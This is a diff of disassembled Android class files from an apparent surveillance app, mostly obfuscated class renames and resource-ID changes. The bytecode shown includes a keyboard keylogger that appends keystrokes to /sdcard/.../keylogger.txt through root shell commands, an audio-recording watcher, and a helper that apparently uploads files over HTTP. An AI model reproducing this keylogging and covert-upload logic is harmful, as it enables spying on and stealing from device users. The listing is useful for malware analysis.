-        - [255] Var: [a:com/android/classic/helper/h][a:[Ljava/lang/String;][a:java/net/HttpURLConnection][a:java/io/DataOutputStream][a:java/io/FileInputStream][a:java/lang/String][a:java/lang/String][a:java/lang/String][a:java/lang/String][a:java/lang/String][i][i][i][a:[B][i][a:java/net/URL], Stack: 
+        - [255] Var: [a:com/android/classic/helper/i][a:[Ljava/lang/String;][a:java/net/HttpURLConnection][a:java/io/DataOutputStream][a:java/io/FileInputStream][a:java/lang/String][a:java/lang/String][a:java/lang/String][a:java/lang/String][a:java/lang/String][i][i][i][a:[B][i][a:java/net/URL], Stack: 
         - [292] Var: ..., Stack: (empty)
-        - [365] Var: [a:com/android/classic/helper/h][a:[Ljava/lang/String;][a:java/net/HttpURLConnection][a:java/io/DataOutputStream][a:java/io/FileInputStream][a:java/lang/String][a:java/lang/String][a:java/lang/String][a:java/lang/String][a:java/lang/String][T][T][T][T][i], Stack: [a:java/lang/Exception]
+        - [365] Var: [a:com/android/classic/helper/i][a:[Ljava/lang/String;][a:java/net/HttpURLConnection][a:java/io/DataOutputStream][a:java/io/FileInputStream][a:java/lang/String][a:java/lang/String][a:java/lang/String][a:java/lang/String][a:java/lang/String][T][T][T][T][i], Stack: [a:java/lang/Exception]
         - [367] Var: ..., Stack: (empty)
   + Method:       a(Ljava/lang/Void;)V
     Access flags: 0x4
@@ -41949,13 +42231,13 @@ Methods (count = 6):
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
       [9] aload_0 v0
       [10] getfield #32
-        + Fieldref [com/android/classic/helper/h.a Ljava/lang/String;]
+        + Fieldref [com/android/classic/helper/i.a Ljava/lang/String;]
       [13] invokevirtual #50
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
       [16] invokevirtual #51
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [19] invokestatic #36
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [22] pop
       [23] return
       Code attribute exceptions (count = 0):
@@ -41970,7 +42252,7 @@ Methods (count = 6):
       [2] checkcast #28
         + Class [java/lang/Void]
       [5] invokevirtual #34
-        + Methodref [com/android/classic/helper/h.a (Ljava/lang/Void;)V]
+        + Methodref [com/android/classic/helper/i.a (Ljava/lang/Void;)V]
       [8] return
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 0):
@@ -41984,7 +42266,7 @@ Methods (count = 6):
       [2] checkcast #16
         + Class [[Ljava/lang/String;]
       [5] invokevirtual #35
-        + Methodref [com/android/classic/helper/h.a ([Ljava/lang/String;)Ljava/lang/Void;]
+        + Methodref [com/android/classic/helper/i.a ([Ljava/lang/String;)Ljava/lang/Void;]
       [8] areturn
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 0):
@@ -42700,15 +42982,15 @@ Interfaces (count = 0):
 
 Constant Pool (count = 36):
   + Class [android/os/FileObserver]
-  + Class [com/android/classic/helper/h]
+  + Class [com/android/classic/helper/i]
   + Class [com/android/classic/recording/Audiorecorder]
   + Class [com/android/classic/recording/c]
   + Class [java/lang/String]
   + Fieldref [com/android/classic/recording/Audiorecorder.a Lcom/android/classic/recording/c;]
   + Fieldref [com/android/classic/recording/c.a Lcom/android/classic/recording/Audiorecorder;]
   + Methodref [android/os/FileObserver.<init> (Ljava/lang/String;I)V]
-  + Methodref [com/android/classic/helper/h.<init> ()V]
-  + Methodref [com/android/classic/helper/h.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+  + Methodref [com/android/classic/helper/i.<init> ()V]
+  + Methodref [com/android/classic/helper/i.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
   + Methodref [com/android/classic/recording/c.stopWatching ()V]
   + NameAndType [<init> ()V]
   + NameAndType [<init> (Ljava/lang/String;I)V]
@@ -42727,7 +43009,7 @@ Constant Pool (count = 36):
   + Utf8 [Lcom/android/classic/recording/c;]
   + Utf8 [a]
   + Utf8 [android/os/FileObserver]
-  + Utf8 [com/android/classic/helper/h]
+  + Utf8 [com/android/classic/helper/i]
   + Utf8 [com/android/classic/recording/Audiorecorder]
   + Utf8 [com/android/classic/recording/c]
   + Utf8 [execute]
@@ -42771,10 +43053,10 @@ Methods (count = 2):
       [7] invokevirtual #11
         + Methodref [com/android/classic/recording/c.stopWatching ()V]
       [10] new #2
-        + Class [com/android/classic/helper/h]
+        + Class [com/android/classic/helper/i]
       [13] dup
       [14] invokespecial #9
-        + Methodref [com/android/classic/helper/h.<init> ()V]
+        + Methodref [com/android/classic/helper/i.<init> ()V]
       [17] iconst_1
       [18] anewarray #5
         + Class [java/lang/String]
@@ -42783,7 +43065,7 @@ Methods (count = 2):
       [23] aload_2 v2
       [24] aastore
       [25] invokevirtual #10
-        + Methodref [com/android/classic/helper/h.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+        + Methodref [com/android/classic/helper/i.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
       [28] pop
       [29] return
       Code attribute exceptions (count = 0):
@@ -42803,7 +43085,7 @@ Interfaces (count = 0):
 
 Constant Pool (count = 201):
   + Integer [2130903040]
-  + Integer [2131296256]
+  + Integer [2131361792]
   + String [Exception in setPreviewDisplay()]
   + String [PreviewDemo-surfaceCallback]
   + Class [android/app/Activity]
@@ -43093,7 +43375,7 @@ Methods (count = 10):
       [11] aload_0 v0
       [12] aload_0 v0
       [13] ldc #2
-        + Integer [2131296256]
+        + Integer [2131361792]
       [15] invokevirtual #55
         + Methodref [com/android/classic/recording/MakePhotoActivity.findViewById (I)Landroid/view/View;]
       [18] checkcast #13
@@ -44069,7 +44351,7 @@ Interfaces (count = 0):
 
 Constant Pool (count = 201):
   + Integer [2130903040]
-  + Integer [2131296256]
+  + Integer [2131361792]
   + String [Exception in setPreviewDisplay()]
   + String [PreviewDemo-surfaceCallback]
   + Class [android/app/Activity]
@@ -44359,7 +44641,7 @@ Methods (count = 10):
       [11] aload_0 v0
       [12] aload_0 v0
       [13] ldc #2
-        + Integer [2131296256]
+        + Integer [2131361792]
       [15] invokevirtual #55
         + Methodref [com/android/classic/recording/MakePhotoActivityBack.findViewById (I)Landroid/view/View;]
       [18] checkcast #13
@@ -45338,12 +45620,12 @@ Constant Pool (count = 301):
   + Integer [16842910]
   + Integer [16842919]
   + Integer [17301602]
-  + Integer [2131034112]
-  + Integer [2131034113]
-  + Integer [2131034114]
-  + Integer [2131034115]
+  + Integer [2131099648]
   + Integer [2131099649]
   + Integer [2131099650]
+  + Integer [2131099651]
+  + Integer [2131165185]
+  + Integer [2131165186]
   + Float [0.5]
   + Class [android/content/Context]
   + Class [android/content/res/Resources]
@@ -45777,7 +46059,7 @@ Methods (count = 14):
       [75] aload_0 v0
       [76] aload_2 v2
       [77] ldc #9
-        + Integer [2131034115]
+        + Integer [2131099651]
       [79] invokevirtual #50
         + Methodref [android/content/res/Resources.getColor (I)I]
       [82] invokevirtual #91
@@ -45785,7 +46067,7 @@ Methods (count = 14):
       [85] aload_0 v0
       [86] aload_2 v2
       [87] ldc #6
-        + Integer [2131034112]
+        + Integer [2131099648]
       [89] invokevirtual #50
         + Methodref [android/content/res/Resources.getColor (I)I]
       [92] putfield #40
@@ -45793,7 +46075,7 @@ Methods (count = 14):
       [95] aload_0 v0
       [96] aload_2 v2
       [97] ldc #7
-        + Integer [2131034113]
+        + Integer [2131099649]
       [99] invokevirtual #50
         + Methodref [android/content/res/Resources.getColor (I)I]
       [102] putfield #41
@@ -45801,7 +46083,7 @@ Methods (count = 14):
       [105] aload_0 v0
       [106] aload_2 v2
       [107] ldc #8
-        + Integer [2131034114]
+        + Integer [2131099650]
       [109] invokevirtual #50
         + Methodref [android/content/res/Resources.getColor (I)I]
       [112] putfield #42
@@ -45809,7 +46091,7 @@ Methods (count = 14):
       [115] aload_0 v0
       [116] aload_2 v2
       [117] ldc #11
-        + Integer [2131099650]
+        + Integer [2131165186]
       [119] invokevirtual #51
         + Methodref [android/content/res/Resources.getDimensionPixelSize (I)I]
       [122] putfield #43
@@ -45841,7 +46123,7 @@ Methods (count = 14):
         + Fieldref [com/example/android/softkeyboard/a.o Landroid/graphics/Paint;]
       [159] aload_2 v2
       [160] ldc #10
-        + Integer [2131099649]
+        + Integer [2131165185]
       [162] invokevirtual #51
         + Methodref [android/content/res/Resources.getDimensionPixelSize (I)I]
       [165] i2f
@@ -46736,9 +47018,9 @@ Constant Pool (count = 56):
   + Integer [1073742079]
   + Integer [2130837507]
   + Integer [2130837508]
-  + Integer [2131165188]
-  + Integer [2131165189]
-  + Integer [2131165190]
+  + Integer [2131230724]
+  + Integer [2131230725]
+  + Integer [2131230726]
   + Class [android/content/res/Resources]
   + Class [android/inputmethodservice/Keyboard]
   + Class [android/inputmethodservice/Keyboard$Key]
@@ -46878,7 +47160,7 @@ Methods (count = 3):
         + Fieldref [com/example/android/softkeyboard/c.a Landroid/inputmethodservice/Keyboard$Key;]
       [64] aload_1 v1
       [65] ldc #4
-        + Integer [2131165188]
+        + Integer [2131230724]
       [67] invokevirtual #18
         + Methodref [android/content/res/Resources.getText (I)Ljava/lang/CharSequence;]
       [70] putfield #15
@@ -46901,7 +47183,7 @@ Methods (count = 3):
         + Fieldref [com/example/android/softkeyboard/c.a Landroid/inputmethodservice/Keyboard$Key;]
       [96] aload_1 v1
       [97] ldc #5
-        + Integer [2131165189]
+        + Integer [2131230725]
       [99] invokevirtual #18
         + Methodref [android/content/res/Resources.getText (I)Ljava/lang/CharSequence;]
       [102] putfield #15
@@ -46941,7 +47223,7 @@ Methods (count = 3):
         + Fieldref [com/example/android/softkeyboard/c.a Landroid/inputmethodservice/Keyboard$Key;]
       [152] aload_1 v1
       [153] ldc #6
-        + Integer [2131165190]
+        + Integer [2131230726]
       [155] invokevirtual #18
         + Methodref [android/content/res/Resources.getText (I)Ljava/lang/CharSequence;]
       [158] putfield #15
@@ -47181,7 +47463,7 @@ Constant Pool (count = 434):
   + Integer [2130968578]
   + Integer [2130968579]
   + Integer [2130968580]
-  + Integer [2131165187]
+  + Integer [2131230723]
   + String []
   + String [' >> /sdcard/Android/data/settings/Logger/key.txt]
   + String [/Android/data/]
@@ -47211,7 +47493,7 @@ Constant Pool (count = 434):
   + Class [com/example/android/softkeyboard/SoftKeyboard]
   + Class [com/example/android/softkeyboard/a]
   + Class [com/example/android/softkeyboard/c]
-  + Class [eu/chainfire/libsuperuser/c]
+  + Class [eu/chainfire/libsuperuser/b]
   + Class [java/io/File]
   + Class [java/io/IOException]
   + Class [java/lang/CharSequence]
@@ -47299,7 +47581,7 @@ Constant Pool (count = 434):
   + Methodref [com/example/android/softkeyboard/c.<init> (Landroid/content/Context;I)V]
   + Methodref [com/example/android/softkeyboard/c.a (Landroid/content/res/Resources;I)V]
   + Methodref [com/example/android/softkeyboard/c.setShifted (Z)Z]
-  + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+  + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
   + Methodref [java/io/File.<init> (Ljava/lang/String;)V]
   + Methodref [java/io/File.createNewFile ()Z]
   + Methodref [java/io/File.mkdirs ()Z]
@@ -47533,7 +47815,7 @@ Constant Pool (count = 434):
   + Utf8 [echo '' >> /sdcard/Lucideus/Logger/keylogger.txt]
   + Utf8 [echo -n ']
   + Utf8 [endBatchEdit]
-  + Utf8 [eu/chainfire/libsuperuser/c]
+  + Utf8 [eu/chainfire/libsuperuser/b]
   + Utf8 [f]
   + Utf8 [finishComposingText]
   + Utf8 [g]
@@ -47879,7 +48161,7 @@ Methods (count = 40):
       [6] invokevirtual #109
         + Methodref [com/example/android/softkeyboard/SoftKeyboard.getResources ()Landroid/content/res/Resources;]
       [9] ldc #6
-        + Integer [2131165187]
+        + Integer [2131230723]
       [11] invokevirtual #65
         + Methodref [android/content/res/Resources.getString (I)Ljava/lang/String;]
       [14] putfield #64
@@ -48749,7 +49031,7 @@ Methods (count = 40):
       [143] ldc #19
         + String [echo '' >> /sdcard/Lucideus/Logger/keylogger.txt]
       [145] invokestatic #125
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [148] pop
       [149] return
       Code attribute exceptions (count = 1):
@@ -48782,7 +49064,7 @@ Methods (count = 40):
       [19] invokevirtual #141
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [22] invokestatic #125
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [25] pop
       [26] return
       Code attribute exceptions (count = 0):
@@ -48809,7 +49091,7 @@ Methods (count = 40):
       [18] invokevirtual #141
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [21] invokestatic #125
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [24] pop
       [25] return
       Code attribute exceptions (count = 0):
@@ -49713,114 +49995,6 @@ _____________________________________________________________________
 
 Interfaces (count = 0):
 
-Constant Pool (count = 44):
-  + String []
-  + String [ ]
-  + String [[]
-  + String [[libsuperuser]]
-  + String [libsuperuser]
-  + Class [android/util/Log]
-  + Class [eu/chainfire/libsuperuser/a]
-  + Class [java/lang/Object]
-  + Class [java/lang/String]
-  + Class [java/lang/StringBuilder]
-  + Methodref [android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I]
-  + Methodref [java/lang/String.startsWith (Ljava/lang/String;)Z]
-  + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
-  + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-  + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-  + NameAndType [<init> (Ljava/lang/String;)V]
-  + NameAndType [append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-  + NameAndType [d (Ljava/lang/String;Ljava/lang/String;)I]
-  + NameAndType [startsWith (Ljava/lang/String;)Z]
-  + NameAndType [toString ()Ljava/lang/String;]
-  + Utf8 []
-  + Utf8 [ ]
-  + Utf8 [()Ljava/lang/String;]
-  + Utf8 [(Ljava/lang/String;)Ljava/lang/StringBuilder;]
-  + Utf8 [(Ljava/lang/String;)V]
-  + Utf8 [(Ljava/lang/String;)Z]
-  + Utf8 [(Ljava/lang/String;Ljava/lang/String;)I]
-  + Utf8 [<init>]
-  + Utf8 [Code]
-  + Utf8 [StackMapTable]
-  + Utf8 [[]
-  + Utf8 [[libsuperuser]]
-  + Utf8 [a]
-  + Utf8 [android/util/Log]
-  + Utf8 [append]
-  + Utf8 [d]
-  + Utf8 [eu/chainfire/libsuperuser/a]
-  + Utf8 [java/lang/Object]
-  + Utf8 [java/lang/String]
-  + Utf8 [java/lang/StringBuilder]
-  + Utf8 [libsuperuser]
-  + Utf8 [startsWith]
-  + Utf8 [toString]
-
-Fields (count = 0):
-
-Methods (count = 1):
-  + Method:       a(Ljava/lang/String;)V
-    Access flags: 0x9
-      = public static void a(java.lang.String)
-    Class member attributes (count = 1):
-    + Code attribute instructions (code length = 51, locals = 1, stack = 4):
-      [0] ldc #5
-        + String [libsuperuser]
-      [2] new #10
-        + Class [java/lang/StringBuilder]
-      [5] dup
-      [6] ldc #4
-        + String [[libsuperuser]]
-      [8] invokespecial #13
-        + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
-      [11] aload_0 v0
-      [12] ldc #3
-        + String [[]
-      [14] invokevirtual #12
-        + Methodref [java/lang/String.startsWith (Ljava/lang/String;)Z]
-      [17] ifne +17 (target=34)
-      [20] aload_0 v0
-      [21] ldc #2
-        + String [ ]
-      [23] invokevirtual #12
-        + Methodref [java/lang/String.startsWith (Ljava/lang/String;)Z]
-      [26] ifne +8 (target=34)
-      [29] ldc #2
-        + String [ ]
-      [31] goto +5 (target=36)
-      [34] ldc #1
-        + String []
-      [36] invokevirtual #14
-        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [39] aload_0 v0
-      [40] invokevirtual #14
-        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [43] invokevirtual #15
-        + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [46] invokestatic #11
-        + Methodref [android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I]
-      [49] pop
-      [50] return
-      Code attribute exceptions (count = 0):
-      Code attribute attributes (attribute count = 1):
-      + Stack map table attribute (count = 2):
-        - [34] Var: [a:java/lang/String], Stack: [a:java/lang/String][a:java/lang/StringBuilder]
-        - [36] Var: [a:java/lang/String], Stack: [a:java/lang/String][a:java/lang/StringBuilder][a:java/lang/String]
-
-Class file attributes (count = 0):
-
-_____________________________________________________________________
-+ Program class: eu/chainfire/libsuperuser/b
-  Superclass:    java/lang/Object
-  Major version: 0x32
-  Minor version: 0x0
-  Access flags:  0x21
-    = public class eu.chainfire.libsuperuser.b extends java.lang.Object
-
-Interfaces (count = 0):
-
 Constant Pool (count = 129):
   + String [
 ]
@@ -49830,8 +50004,8 @@ Constant Pool (count = 129):
 ]
   + String [su]
   + Class [[Ljava/lang/String;]
-  + Class [eu/chainfire/libsuperuser/b]
-  + Class [eu/chainfire/libsuperuser/e]
+  + Class [eu/chainfire/libsuperuser/a]
+  + Class [eu/chainfire/libsuperuser/d]
   + Class [java/io/DataOutputStream]
   + Class [java/io/IOException]
   + Class [java/io/InputStream]
@@ -49844,9 +50018,9 @@ Constant Pool (count = 129):
   + Class [java/util/ArrayList]
   + Class [java/util/Collections]
   + Class [java/util/List]
-  + Methodref [eu/chainfire/libsuperuser/e.<init> (Ljava/lang/String;Ljava/io/InputStream;Ljava/util/List;)V]
-  + Methodref [eu/chainfire/libsuperuser/e.join ()V]
-  + Methodref [eu/chainfire/libsuperuser/e.start ()V]
+  + Methodref [eu/chainfire/libsuperuser/d.<init> (Ljava/lang/String;Ljava/io/InputStream;Ljava/util/List;)V]
+  + Methodref [eu/chainfire/libsuperuser/d.join ()V]
+  + Methodref [eu/chainfire/libsuperuser/d.start ()V]
   + Methodref [java/io/DataOutputStream.<init> (Ljava/io/OutputStream;)V]
   + Methodref [java/io/DataOutputStream.close ()V]
   + Methodref [java/io/DataOutputStream.flush ()V]
@@ -49921,8 +50095,8 @@ Constant Pool (count = 129):
   + Utf8 [close]
   + Utf8 [destroy]
   + Utf8 [equals]
-  + Utf8 [eu/chainfire/libsuperuser/b]
-  + Utf8 [eu/chainfire/libsuperuser/e]
+  + Utf8 [eu/chainfire/libsuperuser/a]
+  + Utf8 [eu/chainfire/libsuperuser/d]
   + Utf8 [exec]
   + Utf8 [exit
 ]
@@ -49991,7 +50165,7 @@ Methods (count = 1):
         + Methodref [java/io/DataOutputStream.<init> (Ljava/io/OutputStream;)V]
       [38] astore v6
       [40] new #8
-        + Class [eu/chainfire/libsuperuser/e]
+        + Class [eu/chainfire/libsuperuser/d]
       [43] dup
       [44] new #17
         + Class [java/lang/StringBuilder]
@@ -50012,10 +50186,10 @@ Methods (count = 1):
         + Methodref [java/lang/Process.getInputStream ()Ljava/io/InputStream;]
       [68] aload v4
       [70] invokespecial #21
-        + Methodref [eu/chainfire/libsuperuser/e.<init> (Ljava/lang/String;Ljava/io/InputStream;Ljava/util/List;)V]
+        + Methodref [eu/chainfire/libsuperuser/d.<init> (Ljava/lang/String;Ljava/io/InputStream;Ljava/util/List;)V]
       [73] astore v7
       [75] new #8
-        + Class [eu/chainfire/libsuperuser/e]
+        + Class [eu/chainfire/libsuperuser/d]
       [78] dup
       [79] new #17
         + Class [java/lang/StringBuilder]
@@ -50040,14 +50214,14 @@ Methods (count = 1):
       [109] goto +4 (target=113)
       [112] aconst_null
       [113] invokespecial #21
-        + Methodref [eu/chainfire/libsuperuser/e.<init> (Ljava/lang/String;Ljava/io/InputStream;Ljava/util/List;)V]
+        + Methodref [eu/chainfire/libsuperuser/d.<init> (Ljava/lang/String;Ljava/io/InputStream;Ljava/util/List;)V]
       [116] astore v8
       [118] aload v7
       [120] invokevirtual #23
-        + Methodref [eu/chainfire/libsuperuser/e.start ()V]
+        + Methodref [eu/chainfire/libsuperuser/d.start ()V]
       [123] aload v8
       [125] invokevirtual #23
-        + Methodref [eu/chainfire/libsuperuser/e.start ()V]
+        + Methodref [eu/chainfire/libsuperuser/d.start ()V]
       [128] aload_1 v1
       [129] dup
       [130] astore v12
@@ -50105,10 +50279,10 @@ Methods (count = 1):
       [214] astore v9
       [216] aload v7
       [218] invokevirtual #22
-        + Methodref [eu/chainfire/libsuperuser/e.join ()V]
+        + Methodref [eu/chainfire/libsuperuser/d.join ()V]
       [221] aload v8
       [223] invokevirtual #22
-        + Methodref [eu/chainfire/libsuperuser/e.join ()V]
+        + Methodref [eu/chainfire/libsuperuser/d.join ()V]
       [226] aload v5
       [228] invokevirtual #28
         + Methodref [java/lang/Process.destroy ()V]
@@ -50144,11 +50318,11 @@ Methods (count = 1):
       + Class [java/lang/InterruptedException]
       Code attribute attributes (attribute count = 1):
       + Stack map table attribute (count = 10):
-        - [112] Var: [a:java/lang/String][a:[Ljava/lang/String;][i][a:java/lang/String][a:java/util/List][a:java/lang/Process][a:java/io/DataOutputStream][a:eu/chainfire/libsuperuser/e], Stack: [u:75][u:75][a:java/lang/String][a:java/io/InputStream]
-        - [113] Var: [a:java/lang/String][a:[Ljava/lang/String;][i][a:java/lang/String][a:java/util/List][a:java/lang/Process][a:java/io/DataOutputStream][a:eu/chainfire/libsuperuser/e], Stack: [u:75][u:75][a:java/lang/String][a:java/io/InputStream][a:java/util/List]
-        - [141] Var: [a:java/lang/String][a:[Ljava/lang/String;][i][a:java/lang/String][a:java/util/List][a:java/lang/Process][a:java/io/DataOutputStream][a:eu/chainfire/libsuperuser/e][a:eu/chainfire/libsuperuser/e][T][i][i][a:[Ljava/lang/String;], Stack: 
+        - [112] Var: [a:java/lang/String][a:[Ljava/lang/String;][i][a:java/lang/String][a:java/util/List][a:java/lang/Process][a:java/io/DataOutputStream][a:eu/chainfire/libsuperuser/d], Stack: [u:75][u:75][a:java/lang/String][a:java/io/InputStream]
+        - [113] Var: [a:java/lang/String][a:[Ljava/lang/String;][i][a:java/lang/String][a:java/util/List][a:java/lang/Process][a:java/io/DataOutputStream][a:eu/chainfire/libsuperuser/d], Stack: [u:75][u:75][a:java/lang/String][a:java/io/InputStream][a:java/util/List]
+        - [141] Var: [a:java/lang/String][a:[Ljava/lang/String;][i][a:java/lang/String][a:java/util/List][a:java/lang/Process][a:java/io/DataOutputStream][a:eu/chainfire/libsuperuser/d][a:eu/chainfire/libsuperuser/d][T][i][i][a:[Ljava/lang/String;], Stack: 
         - [181] Var: ..., Stack: (empty)
-        - [214] Var: [a:java/lang/String][a:[Ljava/lang/String;][i][a:java/lang/String][a:java/util/List][a:java/lang/Process][a:java/io/DataOutputStream][a:eu/chainfire/libsuperuser/e][a:eu/chainfire/libsuperuser/e], Stack: [a:java/io/IOException]
+        - [214] Var: [a:java/lang/String][a:[Ljava/lang/String;][i][a:java/lang/String][a:java/util/List][a:java/lang/Process][a:java/io/DataOutputStream][a:eu/chainfire/libsuperuser/d][a:eu/chainfire/libsuperuser/d], Stack: [a:java/io/IOException]
         - [216] Var: ..., Stack: (empty)
         - [254] Var: [a:java/lang/String][a:[Ljava/lang/String;][i][a:java/lang/String][a:java/util/List], Stack: 
         - [257] Var: ..., Stack: [a:java/io/IOException]
@@ -50163,30 +50337,30 @@ Class file attributes (count = 1):
           + Utf8 [DefaultLocale]
 
 _____________________________________________________________________
-+ Program class: eu/chainfire/libsuperuser/c
++ Program class: eu/chainfire/libsuperuser/b
   Superclass:    java/lang/Object
   Major version: 0x32
   Minor version: 0x0
   Access flags:  0x21
-    = public class eu.chainfire.libsuperuser.c extends java.lang.Object
+    = public class eu.chainfire.libsuperuser.b extends java.lang.Object
 
 Interfaces (count = 0):
 
 Constant Pool (count = 18):
   + String [sh]
+  + Class [eu/chainfire/libsuperuser/a]
   + Class [eu/chainfire/libsuperuser/b]
-  + Class [eu/chainfire/libsuperuser/c]
   + Class [java/lang/Object]
   + Class [java/lang/String]
-  + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;[Ljava/lang/String;Z)Ljava/util/List;]
+  + Methodref [eu/chainfire/libsuperuser/a.a (Ljava/lang/String;[Ljava/lang/String;Z)Ljava/util/List;]
   + NameAndType [a (Ljava/lang/String;[Ljava/lang/String;Z)Ljava/util/List;]
   + Utf8 [(Ljava/lang/String;)Ljava/util/List;]
   + Utf8 [(Ljava/lang/String;[Ljava/lang/String;Z)Ljava/util/List;]
   + Utf8 [([Ljava/lang/String;)Ljava/util/List;]
   + Utf8 [Code]
   + Utf8 [a]
+  + Utf8 [eu/chainfire/libsuperuser/a]
   + Utf8 [eu/chainfire/libsuperuser/b]
-  + Utf8 [eu/chainfire/libsuperuser/c]
   + Utf8 [java/lang/Object]
   + Utf8 [java/lang/String]
   + Utf8 [sh]
@@ -50210,7 +50384,7 @@ Methods (count = 2):
       [9] aastore
       [10] iconst_0
       [11] invokestatic #6
-        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;[Ljava/lang/String;Z)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/a.a (Ljava/lang/String;[Ljava/lang/String;Z)Ljava/util/List;]
       [14] areturn
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 0):
@@ -50224,7 +50398,7 @@ Methods (count = 2):
       [2] aload_0 v0
       [3] iconst_0
       [4] invokestatic #6
-        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;[Ljava/lang/String;Z)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/a.a (Ljava/lang/String;[Ljava/lang/String;Z)Ljava/util/List;]
       [7] areturn
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 0):
@@ -50232,12 +50406,12 @@ Methods (count = 2):
 Class file attributes (count = 0):
 
 _____________________________________________________________________
-+ Program class: eu/chainfire/libsuperuser/d
++ Program class: eu/chainfire/libsuperuser/c
   Superclass:    java/lang/Object
   Major version: 0x32
   Minor version: 0x0
   Access flags:  0x21
-    = public class eu.chainfire.libsuperuser.d extends java.lang.Object
+    = public class eu.chainfire.libsuperuser.c extends java.lang.Object
 
 Interfaces (count = 0):
 
@@ -50248,14 +50422,14 @@ Constant Pool (count = 51):
   + String [su]
   + String [uid=]
   + String [uid=0]
-  + Class [eu/chainfire/libsuperuser/b]
-  + Class [eu/chainfire/libsuperuser/d]
+  + Class [eu/chainfire/libsuperuser/a]
+  + Class [eu/chainfire/libsuperuser/c]
   + Class [java/lang/Object]
   + Class [java/lang/String]
   + Class [java/util/Iterator]
   + Class [java/util/List]
-  + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;[Ljava/lang/String;Z)Ljava/util/List;]
-  + Methodref [eu/chainfire/libsuperuser/d.a ([Ljava/lang/String;)Ljava/util/List;]
+  + Methodref [eu/chainfire/libsuperuser/a.a (Ljava/lang/String;[Ljava/lang/String;Z)Ljava/util/List;]
+  + Methodref [eu/chainfire/libsuperuser/c.a ([Ljava/lang/String;)Ljava/util/List;]
   + Methodref [java/lang/String.contains (Ljava/lang/CharSequence;)Z]
   + InterfaceMethodref [java/util/Iterator.hasNext ()Z]
   + InterfaceMethodref [java/util/Iterator.next ()Ljava/lang/Object;]
@@ -50279,8 +50453,8 @@ Constant Pool (count = 51):
   + Utf8 [a]
   + Utf8 [contains]
   + Utf8 [echo -EOC-]
-  + Utf8 [eu/chainfire/libsuperuser/b]
-  + Utf8 [eu/chainfire/libsuperuser/d]
+  + Utf8 [eu/chainfire/libsuperuser/a]
+  + Utf8 [eu/chainfire/libsuperuser/c]
   + Utf8 [hasNext]
   + Utf8 [id]
   + Utf8 [iterator]
@@ -50312,7 +50486,7 @@ Methods (count = 3):
       [9] aastore
       [10] iconst_0
       [11] invokestatic #13
-        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;[Ljava/lang/String;Z)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/a.a (Ljava/lang/String;[Ljava/lang/String;Z)Ljava/util/List;]
       [14] areturn
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 0):
@@ -50326,7 +50500,7 @@ Methods (count = 3):
       [2] aload_0 v0
       [3] iconst_0
       [4] invokestatic #13
-        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;[Ljava/lang/String;Z)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/a.a (Ljava/lang/String;[Ljava/lang/String;Z)Ljava/util/List;]
       [7] areturn
       Code attribute exceptions (count = 0):
       Code attribute attributes (attribute count = 0):
@@ -50349,7 +50523,7 @@ Methods (count = 3):
         + String [echo -EOC-]
       [13] aastore
       [14] invokestatic #14
-        + Methodref [eu/chainfire/libsuperuser/d.a ([Ljava/lang/String;)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/c.a ([Ljava/lang/String;)Ljava/util/List;]
       [17] astore_0 v0
       [18] aload_0 v0
       [19] ifnonnull +5 (target=24)
@@ -50403,75 +50577,62 @@ Methods (count = 3):
 Class file attributes (count = 0):
 
 _____________________________________________________________________
-+ Program class: eu/chainfire/libsuperuser/e
